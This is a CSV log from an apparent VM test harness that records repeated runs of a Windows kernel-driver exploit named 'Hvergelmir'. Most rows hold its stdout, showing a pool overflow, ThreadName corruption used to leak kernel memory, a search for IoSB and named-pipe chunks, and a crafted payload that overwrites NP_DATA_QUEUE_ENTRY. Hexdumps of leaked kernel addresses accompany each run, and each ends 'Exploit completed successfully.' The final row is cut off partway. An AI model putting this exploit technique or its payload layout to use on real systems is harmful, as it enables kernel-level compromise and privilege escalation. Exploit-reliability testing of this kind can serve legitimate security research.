timestamp,boot_index,run_index,runs_this_boot,vm_state_before,vm_state_after,remote_ready_before,outcome,exit_code,duration_seconds,stdout_tail,stderr_tail,note
2026-06-09T06:11:19+00:00,1,1,1,running,running,True,success,0,7.172,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=7
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:11:36+00:00,1,2,2,running,running,True,success,0,16.0,"HARNESS_EXIT_CODE=0
HARNESS_GUEST_SECONDS=17
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:18:54+00:00,1,1,1,running,running,True,success,0,22.078,True,True,1,1.0,1,1,1,1,"gering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
       Retrying Pool Layout
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
       Retrying Pool Layout
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=13 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [0000026E888A6A00]  42536F490A100000  13007A51B150E6F7
    [0000026E888A6A10]  ECFFFADCE340C607  0000000000000000
    [0000026E888A6A20]  0000000000000000  0000000000000000
    [0000026E888A6A30]  42536F490E0D0003  0000000000000000
    [0000026E888A6A40]  000000000000000C  FFFF930E340C0FC0
    [0000026E888A6A50]  00000000000003E8  6161616161616161
    [0000026E888A6A60]  6161616161616161  6161616161616161
    [0000026E888A6A70]  6161616161616161  6161616161616161
    [0000026E888A6A80]  6161616161616161  6161616161616161
    [0000026E888A6A90]  6161616161616161  6161616161616161
    [0000026E888A6AA0]  6161616161616161  6161616161616161
    [0000026E888A6AB0]  6161616161616161  6161616161616161
    [0000026E888A6AC0]  6161616161616161  6161616161616161
    [0000026E888A6AD0]  6161616161616161  6161616161616161
    [0000026E888A6AE0]  6161616161616161  6161616161616161
    [0000026E888A6AF0]  0000000000000000  0000000000000000
    [0000026E888A6B00]  7246704E0A100000  13007A51B150E1F7
    [0000026E888A6B10]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E888A6B20]  0000000000000000  FFFF930E35F4AF30
    [0000026E888A6B30]  000000C000000000  00000000000000C0
    [0000026E888A6B40]  0000000D45504950  3939393939393939
    [0000026E888A6B50]  3939393939393939  3939393939393939
    [0000026E888A6B60]  3939393939393939  3939393939393939
    [0000026E888A6B70]  3939393939393939  3939393939393939
    [0000026E888A6B80]  3939393939393939  3939393939393939
    [0000026E888A6B90]  3939393939393939  3939393939393939
    [0000026E888A6BA0]  3939393939393939  3939393939393939
    [0000026E888A6BB0]  3939393939393939  3939393939393939
    [0000026E888A6BC0]  3939393939393939  3939393939393939
    [0000026E888A6BD0]  3939393939393939  3939393939393939
    [0000026E888A6BE0]  3939393939393939  3939393939393939
    [0000026E888A6BF0]  3939393939393939  3939393939393939
    [0000026E888A6C00]  7246704E0A100000  13007A51B150E0F7
    [0000026E888A6C10]  FFFF930E35208888  FFFF930E35208888
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [0000026E883B8E40]  7246704E0A100000  13007A51B150E1F7
    [0000026E883B8E50]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E883B8E60]  0000026E883B53F0  FFFF930E35F4AF30
    [0000026E883B8E70]  000000C000000001  
 [*] Full payload to trigger overflow:
    [0000026E883B8E30]  0000000000000000  0000000000000000
    [0000026E883B8E40]  7246704E0A100000  13007A51B150E1F7
    [0000026E883B8E50]  FFFF930E35E6BC08  FFFF930E35E6BC08
    [0000026E883B8E60]  0000026E883B53F0  FFFF930E35F4AF30
    [0000026E883B8E70]  000000C000000001  00000000000000C0
    [0000026E883B8E80]  0000000D45504950  3939393939393939
    [0000026E883B8E90]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=21
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:03+00:00,1,2,2,running,running,True,success,0,7.343,True,True,11,6.0,1,11,11,1,"attempt 10 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 11 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 10 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=988 capture=0 iosbAttempt=10 pipeAttempt=0 pipeLeak=0
    [000001E91A7283A0]  42536F490A100000  13007A51B37396B7
    [000001E91A7283B0]  ECFFFADCE09F3607  0000000000000000
    [000001E91A7283C0]  0000000000000000  0000000000000000
    [000001E91A7283D0]  42536F490E0D0003  0000000000000000
    [000001E91A7283E0]  000000000000000C  FFFF930E35722E20
    [000001E91A7283F0]  00000000000003E8  6161616161616161
    [000001E91A728400]  6161616161616161  6161616161616161
    [000001E91A728410]  6161616161616161  6161616161616161
    [000001E91A728420]  6161616161616161  6161616161616161
    [000001E91A728430]  6161616161616161  6161616161616161
    [000001E91A728440]  6161616161616161  6161616161616161
    [000001E91A728450]  6161616161616161  6161616161616161
    [000001E91A728460]  6161616161616161  6161616161616161
    [000001E91A728470]  6161616161616161  6161616161616161
    [000001E91A728480]  6161616161616161  6161616161616161
    [000001E91A728490]  0000000000000000  0000000000000000
    [000001E91A7284A0]  7246704E0A100000  13007A51B37391B7
    [000001E91A7284B0]  FFFF930E36452508  FFFF930E36452508
    [000001E91A7284C0]  0000000000000000  FFFF930E35F2C350
    [000001E91A7284D0]  000000C000000000  00000000000000C0
    [000001E91A7284E0]  000003DC45504950  3939393939393939
    [000001E91A7284F0]  3939393939393939  3939393939393939
    [000001E91A728500]  3939393939393939  3939393939393939
    [000001E91A728510]  3939393939393939  3939393939393939
    [000001E91A728520]  3939393939393939  3939393939393939
    [000001E91A728530]  3939393939393939  3939393939393939
    [000001E91A728540]  3939393939393939  3939393939393939
    [000001E91A728550]  3939393939393939  3939393939393939
    [000001E91A728560]  3939393939393939  3939393939393939
    [000001E91A728570]  3939393939393939  3939393939393939
    [000001E91A728580]  3939393939393939  3939393939393939
    [000001E91A728590]  3939393939393939  3939393939393939
    [000001E91A7285A0]  7246704E0A100000  13007A51B37390B7
    [000001E91A7285B0]  FFFF930E35E7B748  FFFF930E35E7B748
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E91A728610]  7246704E0A100000  13007A51B37391B7
    [000001E91A728620]  FFFF930E36452508  FFFF930E36452508
    [000001E91A728630]  000001E91A320DE0  FFFF930E35F2C350
    [000001E91A728640]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E91A728600]  0000000000000000  0000000000000000
    [000001E91A728610]  7246704E0A100000  13007A51B37391B7
    [000001E91A728620]  FFFF930E36452508  FFFF930E36452508
    [000001E91A728630]  000001E91A320DE0  FFFF930E35F2C350
    [000001E91A728640]  000000C000000001  00000000000000C0
    [000001E91A728650]  000003DC45504950  3939393939393939
    [000001E91A728660]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=8
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:22+00:00,1,3,3,running,running,True,success,0,17.703,True,True,70,30.857,1,65,5,2,"oSB attempt 4 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 5 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 4 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=27 capture=1 iosbAttempt=4 pipeAttempt=0 pipeLeak=0
    [000002215ECD1B00]  42536F490A100000  13007A51B3005BB7
    [000002215ECD1B10]  ECFFFADCE0013B07  0000000000000000
    [000002215ECD1B20]  0000000000000000  0000000000000000
    [000002215ECD1B30]  42536F490E0D0003  0000000000000000
    [000002215ECD1B40]  000000000000000C  FFFF930E35722040
    [000002215ECD1B50]  00000000000003E8  6161616161616161
    [000002215ECD1B60]  6161616161616161  6161616161616161
    [000002215ECD1B70]  6161616161616161  6161616161616161
    [000002215ECD1B80]  6161616161616161  6161616161616161
    [000002215ECD1B90]  6161616161616161  6161616161616161
    [000002215ECD1BA0]  6161616161616161  6161616161616161
    [000002215ECD1BB0]  6161616161616161  6161616161616161
    [000002215ECD1BC0]  6161616161616161  6161616161616161
    [000002215ECD1BD0]  6161616161616161  6161616161616161
    [000002215ECD1BE0]  6161616161616161  6161616161616161
    [000002215ECD1BF0]  0000000000000000  0000000000000000
    [000002215ECD1C00]  7246704E0A100000  13007A51B3005AB7
    [000002215ECD1C10]  FFFF930E3522E448  FFFF930E3522E448
    [000002215ECD1C20]  0000000000000000  FFFF930E35F46850
    [000002215ECD1C30]  000000C000000000  00000000000000C0
    [000002215ECD1C40]  0000001B45504950  3939393939393939
    [000002215ECD1C50]  3939393939393939  3939393939393939
    [000002215ECD1C60]  3939393939393939  3939393939393939
    [000002215ECD1C70]  3939393939393939  3939393939393939
    [000002215ECD1C80]  3939393939393939  3939393939393939
    [000002215ECD1C90]  3939393939393939  3939393939393939
    [000002215ECD1CA0]  3939393939393939  3939393939393939
    [000002215ECD1CB0]  3939393939393939  3939393939393939
    [000002215ECD1CC0]  3939393939393939  3939393939393939
    [000002215ECD1CD0]  3939393939393939  3939393939393939
    [000002215ECD1CE0]  3939393939393939  3939393939393939
    [000002215ECD1CF0]  3939393939393939  3939393939393939
    [000002215ECD1D00]  7246704E0A100000  13007A51B300A5B7
    [000002215ECD1D10]  FFFF930E36349E28  FFFF930E36349E28
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000002215E6ABC30]  7246704E0A100000  13007A51B3005AB7
    [000002215E6ABC40]  FFFF930E3522E448  FFFF930E3522E448
    [000002215E6ABC50]  000002215E690BF0  FFFF930E35F46850
    [000002215E6ABC60]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000002215E6ABC20]  0000000000000000  0000000000000000
    [000002215E6ABC30]  7246704E0A100000  13007A51B3005AB7
    [000002215E6ABC40]  FFFF930E3522E448  FFFF930E3522E448
    [000002215E6ABC50]  000002215E690BF0  FFFF930E35F46850
    [000002215E6ABC60]  000000C000000001  00000000000000C0
    [000002215E6ABC70]  0000001B45504950  3939393939393939
    [000002215E6ABC80]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=20
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:19:37+00:00,1,4,4,running,running,True,success,0,14.063,True,True,124,30.653,1,65,2,3,"oSB attempt 1 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 3
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 2 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=404 NpFr=504 pipeBase=500 pipeIndex=16 capture=2 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [000001E2764A5830]  42536F490A100000  13007A51B3F2ABB7
    [000001E2764A5840]  ECFFFADCE1BCFB07  0000000000000000
    [000001E2764A5850]  0000000000000000  0000000000000000
    [000001E2764A5860]  42536F490E0D0003  0000000000000000
    [000001E2764A5870]  000000000000000C  FFFF930E345199C0
    [000001E2764A5880]  00000000000003E8  6161616161616161
    [000001E2764A5890]  6161616161616161  6161616161616161
    [000001E2764A58A0]  6161616161616161  6161616161616161
    [000001E2764A58B0]  6161616161616161  6161616161616161
    [000001E2764A58C0]  6161616161616161  6161616161616161
    [000001E2764A58D0]  6161616161616161  6161616161616161
    [000001E2764A58E0]  6161616161616161  6161616161616161
    [000001E2764A58F0]  6161616161616161  6161616161616161
    [000001E2764A5900]  6161616161616161  6161616161616161
    [000001E2764A5910]  6161616161616161  6161616161616161
    [000001E2764A5920]  0000000000000000  0000000000000000
    [000001E2764A5930]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2764A5940]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2764A5950]  0000000000000000  FFFF930E362E44C0
    [000001E2764A5960]  000000C000000000  00000000000000C0
    [000001E2764A5970]  0000001045504950  3939393939393939
    [000001E2764A5980]  3939393939393939  3939393939393939
    [000001E2764A5990]  3939393939393939  3939393939393939
    [000001E2764A59A0]  3939393939393939  3939393939393939
    [000001E2764A59B0]  3939393939393939  3939393939393939
    [000001E2764A59C0]  3939393939393939  3939393939393939
    [000001E2764A59D0]  3939393939393939  3939393939393939
    [000001E2764A59E0]  3939393939393939  3939393939393939
    [000001E2764A59F0]  3939393939393939  3939393939393939
    [000001E2764A5A00]  3939393939393939  3939393939393939
    [000001E2764A5A10]  3939393939393939  3939393939393939
    [000001E2764A5A20]  3939393939393939  3939393939393939
    [000001E2764A5A30]  7246704E0A100000  13007A51B3F2D5B7
    [000001E2764A5A40]  FFFF930E361417C8  FFFF930E361417C8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E2762C63E0]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2762C63F0]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2762C6400]  000001E275EA0770  FFFF930E362E44C0
    [000001E2762C6410]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E2762C63D0]  0000000000000000  0000000000000000
    [000001E2762C63E0]  7246704E0A100000  13007A51B3F2AAB7
    [000001E2762C63F0]  FFFF930E36140E68  FFFF930E36140E68
    [000001E2762C6400]  000001E275EA0770  FFFF930E362E44C0
    [000001E2762C6410]  000000C000000001  00000000000000C0
    [000001E2762C6420]  0000001045504950  3939393939393939
    [000001E2762C6430]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=13
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:27:54+00:00,1,1,1,running,running,True,success,0,3.266,True,True,1,1.0,1,1,1,1," [*] Starting Hvergelmir Exploit
 [+] Connected to driver successfully!

 [*] Pipe layout attempt 1/24

 [*] #### Corrupting ThreadName to Leak Data (VOLATILE) ####
 [*] Priming overflow with chunk size: 0x100
 [*] Triggering overflow with payload size: 0xbc (Padding: 0x98, Overflow: 0x24)
 [*] Sending 0xbc bytes of payload to driver...
 [*] ###### Found ThreadName Overwrite ######
 [*] Cleaned 2999 extra thread names, 0 failed
 [*] IoSB attempt 1 for capture 1
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 0 IoSB attempt 0 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=204 NpFr=304 pipeBase=300 pipeIndex=31 capture=0 iosbAttempt=0 pipeAttempt=0 pipeLeak=0
    [000001DC28036580]  42536F490A100000  1DED768E2C53091F
    [000001DC28036590]  E212DD01988409AF  0000000000000000
    [000001DC280365A0]  0000000000000000  0000000000000000
    [000001DC280365B0]  42536F490E0D0003  0000000000000000
    [000001DC280365C0]  000000000000000C  FFFFE3084DC5A0D0
    [000001DC280365D0]  00000000000003E8  6161616161616161
    [000001DC280365E0]  6161616161616161  6161616161616161
    [000001DC280365F0]  6161616161616161  6161616161616161
    [000001DC28036600]  6161616161616161  6161616161616161
    [000001DC28036610]  6161616161616161  6161616161616161
    [000001DC28036620]  6161616161616161  6161616161616161
    [000001DC28036630]  6161616161616161  6161616161616161
    [000001DC28036640]  6161616161616161  6161616161616161
    [000001DC28036650]  6161616161616161  6161616161616161
    [000001DC28036660]  6161616161616161  6161616161616161
    [000001DC28036670]  0000000000000000  0000000000000000
    [000001DC28036680]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036690]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC280366A0]  0000000000000000  FFFFE30849DAF4A0
    [000001DC280366B0]  000000C000000000  00000000000000C0
    [000001DC280366C0]  0000001F45504950  3939393939393939
    [000001DC280366D0]  3939393939393939  3939393939393939
    [000001DC280366E0]  3939393939393939  3939393939393939
    [000001DC280366F0]  3939393939393939  3939393939393939
    [000001DC28036700]  3939393939393939  3939393939393939
    [000001DC28036710]  3939393939393939  3939393939393939
    [000001DC28036720]  3939393939393939  3939393939393939
    [000001DC28036730]  3939393939393939  3939393939393939
    [000001DC28036740]  3939393939393939  3939393939393939
    [000001DC28036750]  3939393939393939  3939393939393939
    [000001DC28036760]  3939393939393939  3939393939393939
    [000001DC28036770]  3939393939393939  3939393939393939
    [000001DC28036780]  7246704E0A100000  1DED768E2C530B1F
    [000001DC28036790]  FFFFE3084DB2AC08  FFFFE3084DB2AC08
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001DC280367F0]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036800]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC28036810]  000001DC27ABFC10  FFFFE30849DAF4A0
    [000001DC28036820]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001DC280367E0]  0000000000000000  0000000000000000
    [000001DC280367F0]  7246704E0A100000  1DED768E2C530A1F
    [000001DC28036800]  FFFFE3084DB31508  FFFFE3084DB31508
    [000001DC28036810]  000001DC27ABFC10  FFFFE30849DAF4A0
    [000001DC28036820]  000000C000000001  00000000000000C0
    [000001DC28036830]  0000001F45504950  3939393939393939
    [000001DC28036840]  3939393939393939  
 [*] Exploit completed successfully.

HARNESS_EXIT_CODE=
HARNESS_GUEST_SECONDS=2
","#< CLIXML
<Objs Version=""1.1.0.1"" xmlns=""http://schemas.microsoft.com/powershell/2004/04""><Obj S=""progress"" RefId=""0""><TN RefId=""0""><T>System.Management.Automation.PSCustomObject</T><T>System.Object</T></TN><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj><Obj S=""progress"" RefId=""1""><TNRef RefId=""0"" /><MS><I64 N=""SourceId"">1</I64><PR N=""Record""><AV>Preparing modules for first use.</AV><AI>0</AI><Nil /><PI>-1</PI><PC>-1</PC><T>Completed</T><SR>-1</SR><SD> </SD></PR></MS></Obj></Objs>",
2026-06-09T06:28:05+00:00,1,2,2,running,running,True,success,0,9.578,True,True,67,32.06,1,65,2,2," IoSB attempt 1 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] IoSB attempt 2 for capture 2
 [*] Priming overflow with chunk size: 0x100
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Confirmed 2 IoSB candidates before pipe allocation on capture 1 IoSB attempt 1 leak 0
 [*] Pipe allocation attempt 1/16 after confirmed IoSB
 [*] LeakData attempt 0: status=0x0 returnLength=2792 bufSize=65536
 [*] Same leak has 2 IoSB and 9 NpFr candidates on pipe leak 0
 [*] Found layout in same leak: IoSB=704 NpFr=804 pipeBase=800 pipeIndex=8 capture=1 iosbAttempt=1 pipeAttempt=0 pipeLeak=0
    [000001E758005F20]  42536F490A100000  1DED768E3960FC1F
    [000001E758005F30]  E212DD018DDE5CAF  0000000000000000
    [000001E758005F40]  0000000000000000  0000000000000000
    [000001E758005F50]  42536F490E0D0003  0000000000000000
    [000001E758005F60]  000000000000000C  FFFFE3084DC54880
    [000001E758005F70]  00000000000003E8  6161616161616161
    [000001E758005F80]  6161616161616161  6161616161616161
    [000001E758005F90]  6161616161616161  6161616161616161
    [000001E758005FA0]  6161616161616161  6161616161616161
    [000001E758005FB0]  6161616161616161  6161616161616161
    [000001E758005FC0]  6161616161616161  6161616161616161
    [000001E758005FD0]  6161616161616161  6161616161616161
    [000001E758005FE0]  6161616161616161  6161616161616161
    [000001E758005FF0]  6161616161616161  6161616161616161
    [000001E758006000]  6161616161616161  6161616161616161
    [000001E758006010]  0000000000000000  0000000000000000
    [000001E758006020]  7246704E0A100000  1DED768E3960FD1F
    [000001E758006030]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E758006040]  0000000000000000  FFFFE3084BE1C8A0
    [000001E758006050]  000000C000000000  00000000000000C0
    [000001E758006060]  0000000845504950  3939393939393939
    [000001E758006070]  3939393939393939  3939393939393939
    [000001E758006080]  3939393939393939  3939393939393939
    [000001E758006090]  3939393939393939  3939393939393939
    [000001E7580060A0]  3939393939393939  3939393939393939
    [000001E7580060B0]  3939393939393939  3939393939393939
    [000001E7580060C0]  3939393939393939  3939393939393939
    [000001E7580060D0]  3939393939393939  3939393939393939
    [000001E7580060E0]  3939393939393939  3939393939393939
    [000001E7580060F0]  3939393939393939  3939393939393939
    [000001E758006100]  3939393939393939  3939393939393939
    [000001E758006110]  3939393939393939  3939393939393939
    [000001E758006120]  7246704E0A100000  1DED768E3960FE1F
    [000001E758006130]  FFFFE3084E1286A8  FFFFE3084E1286A8
 [*] Prepared payload to overwrite NP_DATA_QUEUE_ENTRY at offset 0x10 within leaked chunk
    [000001E757E9BDB0]  7246704E0A100000  1DED768E3960FD1F
    [000001E757E9BDC0]  FFFFE3084DB39488  FFFFE3084DB39488
    [000001E757E9BDD0]  000001E757AEFE50  FFFFE3084BE1C8A0
    [000001E757E9BDE0]  000000C000000001  
 [*] Full payload to trigger overflow:
    [000001E757E9BDA0]  0000000000000000  0000000000000000
    [000001E757E9BDB0]  7246704E0A100000  1DED768E3960FD1F
